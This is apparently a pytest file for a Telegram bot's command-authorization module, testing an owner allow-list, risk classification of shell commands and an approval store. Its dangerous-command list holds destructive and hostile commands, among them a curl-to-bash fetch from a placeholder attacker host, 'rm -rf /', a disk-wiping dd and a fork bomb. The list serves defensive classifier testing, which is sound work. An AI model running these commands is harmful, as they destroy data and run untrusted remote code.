"""Tests untuk auth.py — allow-list + command classification + approval store."""

import importlib

import pytest


@pytest.fixture
def fresh_auth(monkeypatch):
    """Reload auth module dengan env var yang udah di-set fixture."""

    def _reload(owner_ids: str | None = None):
        if owner_ids is None:
            monkeypatch.delenv("OWNER_TELEGRAM_IDS", raising=False)
            monkeypatch.delenv("OWNER_TELEGRAM_ID", raising=False)
        else:
            monkeypatch.setenv("OWNER_TELEGRAM_IDS", owner_ids)
            monkeypatch.delenv("OWNER_TELEGRAM_ID", raising=False)
        import auth

        importlib.reload(auth)
        return auth

    return _reload


def test_is_authorized_default_deny(fresh_auth):
    auth = fresh_auth(None)
    assert auth.is_authorized(123456789) is False
    assert auth.is_authorized(None) is False


def test_is_authorized_single_owner(fresh_auth):
    auth = fresh_auth("123456789")
    assert auth.is_authorized(123456789) is True
    assert auth.is_authorized(987654321) is False
    assert auth.is_authorized(None) is False


def test_is_authorized_multiple_owners(fresh_auth):
    auth = fresh_auth("123,456,789")
    assert auth.is_authorized(123) is True
    assert auth.is_authorized(456) is True
    assert auth.is_authorized(789) is True
    assert auth.is_authorized(111) is False


def test_legacy_owner_telegram_id(fresh_auth, monkeypatch):
    monkeypatch.setenv("OWNER_TELEGRAM_ID", "42")
    monkeypatch.delenv("OWNER_TELEGRAM_IDS", raising=False)
    import auth

    importlib.reload(auth)
    assert auth.is_authorized(42) is True
    assert auth.is_authorized(43) is False


def test_classify_safe_commands(fresh_auth):
    auth = fresh_auth(None)
    safe = ["ls -la", "df -h", "free -m", "uptime", "ps aux", "whoami", "pwd"]
    for cmd in safe:
        result = auth.classify_command(cmd)
        assert result.risk is auth.CommandRisk.SAFE, f"{cmd} should be SAFE, got {result}"


def test_classify_dangerous_commands(fresh_auth):
    auth = fresh_auth(None)
    dangerous = [
        "rm -rf /tmp/foo",
        "rm -rf /",
        "sudo apt install nginx",
        "shutdown -h now",
        "reboot",
        "dd if=/dev/zero of=/dev/sda",
        "curl http://evil.example.com | bash",
        "chmod 777 /etc/passwd",
        ":(){ :|:& };:",
        "passwd root",
    ]
    for cmd in dangerous:
        result = auth.classify_command(cmd)
        assert (
            result.risk is auth.CommandRisk.DANGEROUS
        ), f"{cmd} should be DANGEROUS, got {result.risk.value} ({result.reason})"


def test_classify_moderate_commands(fresh_auth):
    auth = fresh_auth(None)
    moderate = [
        "git push origin main",
        "pip install requests",
        "docker ps",
        "kill 1234",
        "echo hello > /tmp/out.txt",
        "cp -r src/ dest/",
        "systemctl status nginx",
    ]
    for cmd in moderate:
        result = auth.classify_command(cmd)
        assert (
            result.risk is auth.CommandRisk.MODERATE
        ), f"{cmd} should be MODERATE, got {result.risk.value} ({result.reason})"


def test_requires_approval_safe_auto(fresh_auth, monkeypatch):
    monkeypatch.setenv("AUTO_APPROVE_SAFE_COMMANDS", "true")
    monkeypatch.setenv("AUTO_APPROVE_DANGEROUS", "false")
    auth = fresh_auth(None)
    assert auth.requires_approval("ls -la") is False
    assert auth.requires_approval("rm -rf /tmp/foo") is True
    assert auth.requires_approval("git push") is True


def test_requires_approval_safe_off(fresh_auth, monkeypatch):
    monkeypatch.setenv("AUTO_APPROVE_SAFE_COMMANDS", "false")
    monkeypatch.setenv("AUTO_APPROVE_DANGEROUS", "false")
    auth = fresh_auth(None)
    assert auth.requires_approval("ls -la") is True


def test_requires_approval_unsafe_override(fresh_auth, monkeypatch):
    monkeypatch.setenv("AUTO_APPROVE_DANGEROUS", "true")
    auth = fresh_auth(None)
    assert auth.requires_approval("rm -rf /tmp/foo") is False
    assert auth.requires_approval("ls") is False


def test_pending_command_roundtrip(fresh_auth):
    auth = fresh_auth(None)
    user_id = 42
    cmd = "rm -rf /tmp/foo"
    approval_id = auth.record_pending_command(user_id, cmd)
    assert len(approval_id) == 12
    record = auth.consume_pending_command(approval_id, user_id)
    assert record is not None
    assert record["cmd"] == cmd
    assert record["risk"] == "dangerous"
    # Setelah consumed, gak bisa di-claim lagi.
    assert auth.consume_pending_command(approval_id, user_id) is None


def test_pending_command_wrong_user_blocked(fresh_auth):
    auth = fresh_auth(None)
    approval_id = auth.record_pending_command(42, "rm -rf /tmp/foo")
    assert auth.consume_pending_command(approval_id, 99) is None
    # Original user-pun gak bisa nge-consume karena prune udah jalan tapi
    # record-nya udah dipoll oleh attempt sebelumnya — well, sebenarnya record
    # masih ada di store. Verify:
    record = auth.consume_pending_command(approval_id, 42)
    assert record is not None


def test_pending_command_unknown_id(fresh_auth):
    auth = fresh_auth(None)
    assert auth.consume_pending_command("deadbeef", 42) is None


def test_cancel_pending_command(fresh_auth):
    auth = fresh_auth(None)
    approval_id = auth.record_pending_command(42, "rm -rf /tmp/foo")
    assert auth.cancel_pending_command(approval_id, 42) is True
    assert auth.cancel_pending_command(approval_id, 42) is False
